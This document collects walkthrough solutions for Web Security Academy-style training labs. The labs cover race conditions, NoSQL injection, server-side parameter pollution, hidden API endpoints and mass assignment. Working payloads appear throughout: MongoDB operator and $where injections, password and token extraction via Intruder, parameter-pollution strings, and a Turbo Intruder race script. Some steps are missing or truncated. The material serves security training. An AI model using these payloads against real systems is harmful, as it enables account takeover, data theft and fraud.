4.From the proxy history, identify all endpoints that enable you to interact with the cart. For example, a POST /cart request adds items to the cart and a POST /cart/checkout request submits your order.
5.Add another gift card to your cart, then send the GET /cart request to Burp Repeater.
6.In Repeater, try sending the GET /cart request both with and without your session cookie. Confirm that without the session cookie, you can only access an empty cart. From this, you can infer that:
7.The state of the cart is stored server-side in your session.
8.Any operations on the cart are keyed on your session ID or the associated user ID.
9.This indicates that there is potential for a collision.
10.Notice that submitting and receiving confirmation of a successful order takes place over a single request/response cycle.

11.Consider that there may be a race window between when your order is validated and when it is confirmed. This could enable you to add more items to the order after the server checks whether you have enough store credit.
12.Benchmark the behavior
13.Send both the POST /cart and POST /cart/checkout request to Burp Repeater.
14.In Repeater, add the two tabs to a new group. For details on how to do this, see Creating a new tab group

15.Send the two requests in sequence over a single connection a few times. Notice from the response times that the first request consistently takes significantly longer than the second one. For details on how to do this, see Sending requests in sequence.
16.Add a GET request for the homepage to the start of your tab group.

17.Send all three requests in sequence over a single connection. Observe that the first request still takes longer, but by "warming" the connection in this way, the second and third requests are now completed within a much smaller window.
18.Deduce that this delay is caused by the back-end network architecture rather than the respective processing time of the each endpoint. Therefore, it is not likely to interfere with your attack.
19.Remove the GET request for the homepage from your tab group.
20.Make sure you have a single gift card in your cart.
21.In Repeater, modify the POST /cart request in your tab group so that the productId parameter is set to 1, that is, the ID of the Lightweight L33t Leather Jacket.
22.Send the requests in sequence again.
23.Observe that the order is rejected due to insufficient funds, as you would expect.
24.Prove the concept
25.Remove the jacket from your cart and add another gift card.
26.In Repeater, try sending the requests again, but this time in parallel. For details on how to do this, see Sending requests in parallel.
27.Look at the response to the POST /cart/checkout request:
28.If you received the same "insufficient funds" response, remove the jacket from your cart and repeat the attack. This may take several attempts.
29.If you received a 200 response, check whether you successfully purchased the leather jacket. If so, the lab is solved.

Lab scenario: Single-endpoint race conditions
Lab Description:
This lab's email change feature contains a race condition that enables you to associate an arbitrary email address with your account.
Someone with the address carlos@ginandjuice.shop has a pending invite to be an administrator for the site, but they have not yet created an account. Therefore, any user who successfully claims this address will automatically inherit admin privileges.
To solve the lab:
You can log in to your own account with the following credentials: wiener:peter.
You also have access to an email client, where you can view all emails sent to @exploit-<YOUR-EXPLOIT-SERVER-ID>.exploit-server.net addresses.
Solution Steps: 1.Predict a potential collision

2.Log in and attempt to change your email to anything@exploit-<YOUR-EXPLOIT-SERVER-ID>.exploit-server.net. Observe that a confirmation email is sent to your intended new address, and you're prompted to click a link containing a unique token to confirm the change.
3.Complete the process and confirm that your email address has been updated on your account page.
4.Try submitting two different @exploit-<YOUR-EXPLOIT-SERVER-ID>.exploit-server.net email addresses in succession, then go to the email client.

5.Notice that if you try to use the first confirmation link you received, this is no longer valid. From this, you can infer that the website only stores one pending email address at a time. As submitting a new email address edits this entry in the database rather than appending to it, there is potential for a collision.
6.Benchmark the behavior
7.Send the POST /my-account/change-email request to Repeater.
8.In Repeater, add the new tab to a group. For details on how to do this, see Creating a new tab group.
9.Right-click the grouped tab, then select Duplicate tab. Create 19 duplicate tabs. The new tabs are automatically added to the group.

10.In each tab, modify the first part of the email address so that it is unique to each request, for example, test1@exploit-<YOUR-EXPLOIT-SERVER-ID>.exploit-server.net, test2@..., test3@... and so on.
11.Send the group of requests in sequence over separate connections. For details on how to do this, see Sending requests in sequence.
12.Go back to the email client and observe that you have received a single confirmation email for each of the email change requests.
13.Probe for clues

14.In Repeater, send the group of requests again, but this time in parallel, effectively attempting to change the pending email address to multiple different values at the same time. For details on how to do this, see Sending requests in parallel.
15.Go to the email client and study the new set of confirmation emails you've received. Notice that, this time, the recipient address doesn't always match the pending new email address.
16.Consider that there may be a race window between when the website:
17.Kicks off a task that eventually sends an email to the provided address.
18.Retrieves data from the database and uses this to render the email template.
19.Deduce that when a parallel request changes the pending email address stored in the database during this window, this results in confirmation emails being sent to the wrong address.
20.Prove the concept
21.In Repeater, create a new group containing two copies of the POST /my-account/change-email request.
22.Change the email parameter of one request to anything@exploit-<YOUR-EXPLOIT-SERVER-ID>.exploit-server.net.
23.Change the email parameter of the other request to carlos@ginandjuice.shop.
24.Send the requests in parallel.
25.Check your inbox:
26.If you received a confirmation email in which the address in the body matches your own address, resend the requests in parallel and try again.
27.If you received a confirmation email in which the address in the body is carlos@ginandjuice.shop, click the confirmation link to update your address accordingly.
28.Go to your account page and notice that you now see a link for accessing the admin panel.
29.Visit the admin panel and delete the user carlos to solve the lab.

Lab scenario: Exploiting time-sensitive vulnerabilities
Lab Description:
This lab contains a password reset mechanism. Although it doesn't contain a race condition, you can exploit the mechanism's broken cryptography by sending carefully timed requests.
To solve the lab:
You can log into your account with the following credentials: wiener:peter.
Solution Steps: 1.Study the behavior

2.Study the password reset process by submitting a password reset for your own account and observe that you're sent an email containing a reset link. The query string of this link includes your username and a token.
3.Send the POST /forgot-password request to Burp Repeater.
4.In Repeater, send the request a few times, then check your inbox again.
5.Observe that every reset request results in a link with a different token.
6.Consider the following:
7.The token is of a consistent length. This suggests that it's either a randomly generated string with a fixed number of characters, or could be a hash of some unknown data, which may be predictable.
8.The fact that the token is different each time indicates that, if it is in fact a hash digest, it must contain some kind of internal state, such as an RNG, a counter, or a timestamp.
9.Duplicate the Repeater tab and add both tabs to a new group. For details on how to do this, see Creating a new tab group
10.Send the pair of reset requests in parallel a few times.  For details on how to do this, see Sending requests in parallel.

11.Observe that there is still a significant delay between each response and that you still get a different token in each confirmation email. Infer that your requests are still being processed in sequence rather than concurrently.
12.Bypass the per-session locking restriction
13.Notice that your session cookie suggests that the website uses a PHP back-end. This could mean that the server only processes one request at a time per session.
14.Send the GET /forgot-password request to Burp Repeater, remove the session cookie from the request, then send it.

15.From the response, copy the newly issued session cookie and CSRF token and use them to replace the respective values in one of the two POST /forgot-password requests. You now have a pair of password reset requests from two different sessions.
16.Send the two POST requests in parallel a few times and observe that the processing times are now much more closely aligned, and sometimes identical.
17.Confirm the vulnerability

18.Go back to your inbox and notice that when the response times match for the pair of reset requests, this results in two confirmation emails that use an identical token. This confirms that a timestamp must be one of the inputs for the hash.
19.Consider that this also means the token would be predictable if you knew the other inputs for the hash function.
20.Notice the separate username parameter. This suggests that the username might not be included in the hash, which means that two different usernames could theoretically have the same token.
21.In Repeater, go to the pair of POST /forgot-password requests and change the username parameter in one of them to carlos.
22.Resend the two requests in parallel. If the attack worked, both users should be assigned the same reset token, although you won't be able to see this.
23.Check your inbox again and observe that, this time, you've only received one new confirmation email. Infer that the other email, hopefully containing the same token, has been sent to Carlos.
24.Copy the link from the email and change the username in the query string to carlos.
25.Visit the URL in the browser and observe that you're taken to the form for setting a new password as normal.
26.Set the password to something you'll remember and submit the form.
27.Try logging in as carlos using the password you just set.
28.If you can't log in, resend the pair of password reset emails and repeat the process.
29.If you successfully log in, visit the admin panel and delete the user carlos to solve the lab.

Lab scenario: Partial construction race conditions
Lab Description:
This lab contains a user registration mechanism. A race condition enables you to bypass email verification and register with an arbitrary email address that you do not own.
To solve the lab, exploit this race condition to create an account, then log in and delete the user carlos.
Solution Steps: 1.Predict a potential collision
2.Study the user registration mechanism. Observe that:
3.You can only register using @ginandjuice.shop email addresses.
4.To complete the registration, you need to visit the confirmation link, which is sent via email.
5.As you don't have access to an @ginandjuice.shop email account, you don't appear to have a way to access a valid confirmation link.
6.In Burp, from the proxy history, notice that there is a request to fetch /resources/static/users.js.

7.Study the JavaScript and notice that this dynamically generates a form for the confirmation page, which is presumably linked from the confirmation email. This leaks the fact that the final confirmation is submitted via a POST request to /confirm, with the token provided in the query string.
8.In Burp Repeater, create an equivalent request to what your browser might send when clicking the confirmation link. For example:
9.POST /confirm?token=1 HTTP/2
10.Host: YOUR-LAB-ID.web-security-academy.net
11.Content-Type: x-www-form-urlencoded
12.Content-Length: 0
13.Experiment with the token parameter in your newly crafted confirmation request. Observe that:
14.If you submit an arbitrary token, you receive an Incorrect token: <YOUR-TOKEN> response.
15.If you remove the parameter altogether, you receive a Missing parameter: token response.
16.If you submit an empty token parameter, you receive a Forbidden response.
17.Consider that this Forbidden response may indicate that the developers have patched a vulnerability that could be exploited by sending an empty token parameter.
18.Consider that there may be a small race window between:
19.When you submit a request to register a user.
20.When the newly generated registration token is actually stored in the database.
21.If so, there may be a temporary sub-state in which null (or equivalent) is a valid token for confirming the user's registration.
22.Experiment with different ways of submitting a token parameter with a value equivalent to null. For example, some frameworks let you to pass an empty array as follows:
23.POST /confirm?token[]=

24.Observe that this time, instead of the Forbidden response, you receive an Invalid token: Array response. This shows that you've successfully passed in an empty array, which could potentially match an uninitialized registration token.
25.Benchmark the behavior
26.Send the POST /register request to Burp Repeater.
27.In Burp Repeater, experiment with the registration request. Observe that if you attempt to register the same username more than once, you get a different response.
28.In a separate Repeater tab, use what you've learned from the JavaScript import to construct a confirmation request with an arbitrary token. For example:
29.POST /confirm?token=1 HTTP/2
30.Host: YOUR-LAB-ID.web-security-academy.net
31.Cookie: phpsessionid=YOUR-SESSION-ID
32.Content-Type: application/x-www-form-urlencoded
33.Content-Length: 0
34.Add both requests to a new tab group.

35.Try sending both requests sequentially and in parallel several times, making sure to change the username in the registration request each time to avoid hitting the separate Account already exists with this name code path. For details on how to do this, see
36.Sending grouped HTTP requests.
37.Notice that the confirmation response consistently arrives much quicker than the response to the registration request.
38.Prove the concept
39.Note that you need the server to begin creating the pending user in the database, then compare the token you send in the confirmation request before the user creation is complete.
40.Consider that as the confirmation response is always processed much more quickly, you need to delay this so that it falls within the race window.
41.In the POST /register request, highlight the value of the username parameter, then right-click and select Extensions > Turbo Intruder > Send to turbo intruder.
42.In Turbo Intruder, in the request editor:
43.Notice that the value of the username parameter is automatically marked as a payload position with the %s placeholder.
44.Make sure the email parameter is set to an arbitrary @ginandjuice.shop address that is not likely to already be registered on the site.
45.Make a note of the static value of the password parameter. You'll need this later.
46.From the drop-down menu, select the examples/race-single-packet-attack.py template.
47.In the Python editor, modify the main body of the template as follows:
48.Define a variable containing the confirmation request you've been testing in Repeater.
49.Create a loop that queues a single registration request using a new username for each attempt. Set the gate argument to match the current iteration.
50.Create a nested loop that queues a large number of confirmation requests for each attempt. These should also use the same release gate.
51.Open the gate for all the requests in each attempt at the same time.
52.The resulting script should look something like this:
53.def queueRequests(target, wordlists):
54.engine = RequestEngine(endpoint=target.endpoint,
55.concurrentConnections=1,
56.engine=Engine.BURP2
58.confirmationReq = '''POST /confirm?token[]= HTTP/2
59.Host: YOUR-LAB-ID.web-security-academy.net
60.Cookie: phpsessionid=YOUR-SESSION-TOKEN
61.Content-Length: 0
63.for attempt in range(20):
64.currentAttempt = str(attempt)
65.username = 'User' + currentAttempt
66.# queue a single registration request
67.engine.queue(target.req, username, gate=currentAttempt)
68.# queue 50 confirmation requests - note that this will probably sent in two separate packets
69.for i in range(50):
70.engine.queue(confirmationReq, gate=currentAttempt)
71.# send all the queued requests for this attempt
72.engine.openGate(currentAttempt)
73.def handleResponse(req, interesting):
74.table.add(req)
75.Launch the attack.
76.In the results table, sort the results by the Length column.
77.If the attack was successful, you should see one or more 200 responses to your confirmation request containing the message Account registration for user <USERNAME> successful.
78.Make a note of the username from one of these responses. If you used the example script above, this will be something like User4.
79.In the browser, log in using this username and the static password you used in the registration request.
80.Access the admin panel and delete carlos to solve the lab.

Lab scenario: Detecting NoSQL injection
Lab Description:
The product category filter for this lab is powered by a MongoDB NoSQL database. It is vulnerable to NoSQL injection.
To solve the lab, perform a NoSQL injection attack that causes the application to display unreleased products.
Solution Steps: 1.In Burp's browser, access the lab and click on a product category filter.
2.In Burp, go to Proxy > HTTP history. Right-click the category filter request and select Send to Repeater.
3.In Repeater, submit a ' character in the category parameter. Notice that this causes a JavaScript syntax error. This may indicate that the user input was not filtered or sanitized correctly.
4.Submit a valid JavaScript payload in the value of the category query parameter. You could use the following payload:
5.Gifts'+'

6.Make sure to URL-encode the payload by highlighting it and using the Ctrl-U hotkey. Notice that it doesn't cause a syntax error. This indicates that a form of server-side injection may be occurring.
7.Identify whether you can inject boolean conditions to change the response:
8.Insert a false condition in the category parameter. For example:
9.Gifts' && 0 && 'x
10.Make sure to URL-encode the payload. Notice that no products are retrieved.
11.Insert a true condition in the category parameter. For example:
13.Make sure to URL-encode the payload. Notice that products in the Gifts category are retrieved.
14.Submit a boolean condition that always evaluates to true in the category parameter. For example:
16.Right-click the response and select Show response in browser.
17.Copy the URL and load it in Burp's browser. Verify that the response now contains unreleased products. The lab is solved.

Lab scenario: Exploiting NoSQL operator injection to bypass authentication
Lab Description:
The login functionality for this lab is powered by a MongoDB NoSQL database. It is vulnerable to NoSQL injection using MongoDB operators.
To solve the lab, log into the application as the administrator user.
You can log in to your own account using the following credentials: wiener:peter.
Solution Steps: 1.In Burp's browser, log in to the application using the credentials wiener:peter.
2.In Burp, go to Proxy > HTTP history. Right-click the POST /login request and select Send to Repeater.
3.In Repeater, test the username and password parameters to determine whether they allow you to inject MongoDB operators:
4.Change the value of the username parameter from "wiener" to {"$ne":""}, then send the request. Notice that this enables you to log in.
5.Change the value of the username parameter from {"$ne":""} to {"$regex":"wien.*"}, then send the request. Notice that you can also log in when using the
6.$regex operator.

7.With the username parameter set to {"$ne":""}, change the value of the password parameter from "peter" to {"$ne":""}, then send the request again. Notice that this causes the query to return an unexpected number of records. This indicates that more than one user has been selected.

8.With the password parameter set as {"$ne":""}, change the value of the username parameter to {"$regex":"admin.*"}, then send the request again. Notice that this successfully logs you in as the admin user.
9.Right-click the response, then select Show response in browser. Copy the URL.
10.Paste the URL into Burp's browser to log in as the administrator user. The lab is solved.

Lab scenario: Exploiting NoSQL injection to extract data
Lab Description:
The user lookup functionality for this lab is powered by a MongoDB NoSQL database. It is vulnerable to NoSQL injection.
To solve the lab, extract the password for the administrator user, then log in to their account.
You can log in to your own account using the following credentials: wiener:peter.
Solution Steps: 1.In Burp's browser, access the lab and log in to the application using the credentials wiener:peter.
2.In Burp, go to Proxy > HTTP history. Right-click the GET /user/lookup?user=wiener request and select
3.Send to Repeater.
4.In Repeater, submit a ' character in the user parameter. Notice that this causes an error. This may indicate that the user input was not filtered or sanitized correctly.
5.Submit a valid JavaScript payload in the user parameter. For example, you could use wiener'+'
6.Make sure to URL-encode the payload by highlighting it and using the hotkey Ctrl-U. Notice that it retrieves the account details for the
7.wiener user, which indicates that a form of server-side injection may be occurring.
8.Identify whether you can inject boolean conditions to change the response:
9.Submit a false condition in the user parameter. For example: wiener' && '1'=='2
10.Make sure to URL-encode the payload. Notice that it retrieves the message Could not find user.
11.Submit a true condition in the user parameter. For example: wiener' &&
13.Make sure to URL-encode the payload. Notice that it no longer causes an error. Instead, it retrieves the account details for the
14.wiener user. This demonstrates that you can trigger different responses for true and false conditions.
15.Identify the password length:
16.Change the user parameter to administrator' && this.password.length < 30 || 'a'=='b, then send the request.

17.Make sure to URL-encode the payload. Notice that the response retrieves the account details for the administrator user. This indicates that the condition is true because the password is less than 30 characters.
18.Reduce the password length in the payload, then resend the request.
19.Continue to try different lengths.
20.Notice that when you submit the value 9, you retrieve the account details for the administrator user, but when you submit the value
21.8, you receive an error message because the condition is false. This indicates that the password is 8 characters long.
22.Right-click the request and select Send to Intruder.
23.In Intruder, enumerate the password:
24.Change the user parameter to administrator' && this.password[§0§]=='§a§. This includes two payload positions. Make sure to URL-encode the payload.
25.Select Cluster bomb attack from the attack type drop-down menu.
26.In the Payloads side panel, select position 1 from the Payload position drop-down list. Add numbers from 0 to 7 for each character of the password.
27.Select position 2 from the Payload position drop-down list, then add lowercase letters from a to
28.z. If you're using Burp Suite Professional, you can use the built-in a-z list.
29.Click  Start attack.
30.Sort the attack results by Payload 1, then Length. Notice that one request for each character position (0 to 7) has evaluated to true and retrieved the details for the
31.administrator user. Note the letters from the Payload 2 column down.
32.In Burp's browser, log in as the administrator user using the enumerated password. The lab is solved.

Lab scenario: Exploiting NoSQL operator injection to extract unknown fields
Lab Description:
The user lookup functionality for this lab is powered by a MongoDB NoSQL database. It is vulnerable to NoSQL injection.
To solve the lab, log in as carlos.
Solution Steps: 1.In Burp's browser, attempt to log in to the application with username carlos and password invalid. Notice that you receive an Invalid username or password error message.
2.In Burp, go to Proxy > HTTP history. Right-click the POST
3./login request and select Send to Repeater.
4.In Repeater, change the value of the password parameter from "invalid" to
5.{"$ne":"invalid"}, then send the request. Notice that you now receive an
6.Account locked error message. You can't access Carlos's account, but this response indicates that the $ne operator has been accepted and the application is vulnerable.

7.In Burp's browser, attempt to reset the password for the carlos account. When you submit the carlos username, observe that the reset mechanism involves email verification, so you can't reset the account yourself.
8.In Repeater, use the POST /login request to test whether the application is vulnerable to JavaScript injection:
9.Add "$where": "0" as an additional parameter in the JSON data as follows:
10.{"username":"carlos","password":{"$ne":"invalid"}, "$where": "0"}
11.Send the request. Notice that you receive an Invalid username or password error message.
12.Change "$where": "0" to "$where": "1", then resend the request. Notice that you receive an Account locked error message. This indicates that the JavaScript in the $where clause is being evaluated.
13.Right-click the request and select Send to Intruder.
14.In Intruder, construct an attack to identify all the fields on the user object:
15.Update the $where parameter as follows:
16."$where":"Object.keys(this)[1].match('^.{}.*')"
17.Add two payload positions. The first identifies the character position number, and
18.the second identifies the character itself:
19."$where":"Object.keys(this)[1].match('^.{§§}§§.*')"
20.Select Cluster bomb attack from the attack type drop-down menu.
21.In the Payloads side panel, select position 1 from the Payload position drop-down list, then set the
22.Payload type to
23.Numbers. Set the number range, for example from 0 to 20.
24.Select position 2 from the Payload position drop-down list and make sure the Payload type is set to
25.Simple list. Add all numbers,
26.lower-case letters and upper-case letters as payloads. If you're using Burp Suite Professional,
27.you can use the built-in word lists a-z, A-Z, and 0-9.
28.Click  Start attack.
29.Sort the attack results by Payload 1, then Length, to identify responses with an
30.Account locked message
31.instead of the Invalid username or password message. Notice that the characters in the Payload
32.2 column
33.spell out the name of the parameter: username.
34.Repeat the above steps to identify further JSON parameters. You can do this
35.by incrementing the index of the keys array with each attempt, for example:
36."$where":"Object.keys(this)[2].match('^.{}.*')"
37.Notice that one of the JSON parameters is for a password reset token.
38.Test the identified password reset field name as a query parameter on different
39.endpoints:
40.In Proxy > HTTP history, identify the GET
41./forgot-password request as a
42.potentially interesting endpoint, as it relates to the password reset
43.functionality. Right-click the request and select Send to Repeater.
44.In Repeater, submit an invalid field in the URL: GET
45./forgot-password?foo=invalid.
46.Notice that the response is identical to the original response.
47.Submit the exfiltrated name of the password reset token field in the URL:
48.GET /forgot-password?YOURTOKENNAME=invalid. Notice that you receive an
49.Invalid token error message. This confirms that you have the correct token name and endpoint.
50.In Intruder, use the POST /login request to construct an attack that
51.extracts the value of Carlos's password reset token:
52.Keep the settings from your previous attack, but update the $where parameter as follows: "$where":"this.YOURTOKENNAME.match('^.{§§}§§.*')"
53.Make sure that you replace YOURTOKENNAME with the password reset token name that you exfiltrated in the previous step.
54.Click  Start attack.

55.Sort the attack results by Payload 1, then Length, to identify responses with an Account locked message instead of the Invalid username or password message. Note the letters from the Payload 2 column down.
56.In Repeater, submit the value of the password reset token in the URL of the GET /
57.forgot-password request:
58.GET /forgot-password?YOURTOKENNAME=TOKENVALUE.
59.Right-click the response and select Request in browser > Original session. Paste this into Burp's browser.
60.Change Carlos's password, then log in as carlos to solve the lab.

Lab scenario: Exploiting an API endpoint using documentation
Lab Description: To solve the lab, find the exposed API documentation and delete carlos. You can log in to your own account using the following credentials: wiener:peter.
Solution Steps: 1.In Burp's browser, log in to the application using the credentials wiener:peter and update your email address.
2.In Proxy > HTTP history, right-click the PATCH /api/user/wiener request and select Send to Repeater.
3.Go to the Repeater tab. Send the PATCH /api/user/wiener request. Notice that this retrieves credentials for the user
4.wiener.
5.Remove /wiener from the path of the request, so the endpoint is now /api/user, then send the request. Notice that this returns an error because there is no user identifier.
6.Remove /user from the path of the request, so the endpoint is now /api, then send the request. Notice that this retrieves API documentation.
7.Right-click the response and select Show response in browser. Copy the URL.
8.Paste the URL into Burp's browser to access the documentation. Notice that the documentation is interactive.
9.To delete Carlos and solve the lab, click on the DELETE row, enter carlos, then click Send request.

Lab scenario: Exploiting server-side parameter pollution in a query string
Lab Description: To solve the lab, log in as the administrator and delete carlos.
Solution Steps: 1.In Burp's browser, trigger a password reset for the administrator user.
2.In Proxy > HTTP history, notice the POST /forgot-password request and the related
3./static/js/forgotPassword.js JavaScript file.
4.Right-click the POST /forgot-password request and select Send to
5.Repeater.
6.In the Repeater tab, resend the request to confirm that the response is consistent.
7.Change the value of the username parameter from administrator to an invalid username, such as
8.administratorx. Send the request. Notice that this results in an Invalid username error message.
9.Attempt to add a second parameter-value pair to the server-side request using a URL-encoded & character. For example, add URL-encoded &x=y:
10.username=administrator%26x=y

11.Send the request. Notice that this returns a Parameter is not supported error message. This suggests that the internal API may have interpreted &x=y as a separate parameter, instead of part of the username.
12.Attempt to truncate the server-side query string using a URL-encoded # character:
13.username=administrator%23
14.Send the request. Notice that this returns a Field not specified error message. This suggests that the server-side query may include an additional parameter called
15.field, which has been removed by the # character.
16.Add a field parameter with an invalid value to the request. Truncate the query string after the added parameter-value pair. For example, add URL-encoded &field=x#:
17.username=administrator%26field=x%23
18.Send the request. Notice that this results in an Invalid field error message. This suggests that the server-side application may recognize the injected field parameter.
19.Brute-force the value of the field parameter:
20.Right-click the POST /forgot-password request and select Send to Intruder.
21.In the Intruder tab, add a payload position to the value of the field parameter as follows:
22.username=administrator%26field=§x§%23
23.In the Payloads side panel, under Payload configuration, click Add from list. Select the built-in Server-side variable names payload list, then start the attack.
24.Review the results. Notice that the requests with the username and email payloads both return a 200 response.
25.Change the value of the field parameter from x# to email:
26.username=administrator%26field=email%23
27.Send the request. Notice that this returns the original response. This suggests that email is a valid field type.
28.In Proxy > HTTP history, review the /static/js/forgotPassword.js JavaScript file. Notice the password reset endpoint, which refers to the
29.reset_token parameter:
30./forgot-password?reset_token=${resetToken}
31.In the Repeater tab, change the value of the field parameter from
32.email to reset_token:
33.username=administrator%26field=reset_token%23
34.Send the request. Notice that this returns a password reset token. Make a note of this.
35.In Burp's browser, enter the password reset endpoint in the address bar. Add your password reset token as the value of the
36.reset_token parameter . For example:
37./forgot-password?reset_token=123456789
38.Set a new password.
39.Log in as the administrator user using your password.
40.Go to the Admin panel and delete carlos to solve the lab.

Lab scenario: Finding and exploiting an unused API endpoint
Lab Description: To solve the lab, exploit a hidden API endpoint to buy a Lightweight l33t Leather Jacket. You can log in to your own account using the following credentials: wiener:peter.
Solution Steps: 1.In Burp's browser, access the lab and click on a product.
2.In Proxy > HTTP history, notice the API request for the product. For example, /api/products/3/price.
3.Right-click the API request and select Send to Repeater.
4.In the Repeater tab, change the HTTP method for the API request from GET to OPTIONS, then send the request. Notice that the response specifies that the GET and PATCH methods are allowed.

5.Change the method for the API request from GET to PATCH, then send the request. Notice that you receive an Unauthorized message. This may indicate that you need to be authenticated to update the order.
6.In Burp's browser, log in to the application using the credentials
7.wiener:peter.
8.Click on the Lightweight "l33t" Leather Jacket product.
9.In Proxy > HTTP history, right-click the
10.API/products/1/price request for the leather jacket and select Send to Repeater.
11.In the Repeater tab, change the method for the API request from GET to PATCH, then send the request. Notice that this causes an error due to an incorrect
12.Content-Type. The error message specifies that the Content-Type should be application/json.
13.Add a Content-Type header and set the value to application/json.
14.Add an empty JSON object {} as the request body, then send the request. Notice that this causes an error due to the request body missing a price parameter.
15.Add a price parameter with a value of 0 to the JSON object {"price":0}. Send the request.
16.In Burp's browser, reload the leather jacket product page. Notice that the price of the leather jacket is now $0.00.
17.Add the leather jacket to your basket.
18.Go to your basket and click Place order to solve the lab.

Lab scenario: Exploiting a mass assignment vulnerability
Lab Description: To solve the lab, find and exploit a mass assignment vulnerability to buy a Lightweight l33t Leather Jacket. You can log in to your own account using the following credentials: wiener:peter.
Solution Steps: 1.In Burp's browser, log in to the application using the credentials
2.wiener:peter.
3.Click on the Lightweight "l33t" Leather Jacket product and add it to your basket.

8.chosen_discount parameter, which is not present in the POST request.
9.Right-click the POST /api/checkout request and select Send to Repeater.

12."chosen_discount":{
13."percentage":0
15."chosen_products":[
17."product_id":"1",
18."quantity":1
22.Send the request. Notice that adding the chosen_discount parameter doesn't cause an error.

23.Change the chosen_discount value to the string "x", then send the request. Observe that this results in an error message as the parameter value isn't a number. This may indicate that the user input is being processed.
